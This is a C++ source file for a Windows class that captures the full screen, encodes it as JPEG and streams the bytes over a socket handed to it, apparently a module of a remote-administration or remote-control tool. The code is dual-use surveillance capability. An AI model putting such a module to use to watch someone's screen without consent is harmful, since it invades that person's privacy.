
#include "Screenshot.h"

static ULONG_PTR gdiToken;
static Gdiplus::GdiplusStartupInput gdiStartupInfo;
HDC hdcScreen = GetDC(NULL);
HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
HBITMAP hbmScreen = NULL;
SOCKET sClientSocket;

Screenshot::Screenshot(SOCKET sIncomingSocket) {

	sClientSocket = sIncomingSocket;

	printf("Screenshot::Screenshot\n");

	Screenshot::InitializeToken();
	Screenshot::TakeScreenshot();

}

Screenshot::~Screenshot() {

	Gdiplus::GdiplusShutdown(gdiToken);

	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

}

bool Screenshot::InitializeToken(){

	GdiplusStartup(&gdiToken, &gdiStartupInfo, NULL);


	return true;
}

bool Screenshot::TakeScreenshot() {


	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;
	std::vector<BYTE> buf;

	DWORD dwWidth = GetSystemMetrics(SM_CXSCREEN);
	DWORD dwHeight = GetSystemMetrics(SM_CYSCREEN);

	hbmScreen = CreateCompatibleBitmap(hdcScreen, dwWidth, dwHeight);
	SelectObject(hdcMemDC, hbmScreen);

	BitBlt(hdcMemDC, 0, 0, dwWidth, dwHeight, hdcScreen, 0, 0, SRCCOPY);

	Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(hbmScreen, (HPALETTE)0);

	image.Attach(hbmScreen);
	image.Save(stream, Gdiplus::ImageFormatJPEG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();
	char cSize[10];
	int iSize = buf.size() * sizeof(BYTE);

	sprintf_s(cSize, "%d", buf.size() * sizeof(BYTE));


	send(sClientSocket, cSize, 10, 0);

	send(sClientSocket, reinterpret_cast<const char*>(&buf[0]), iSize, 0);


	return true;

}
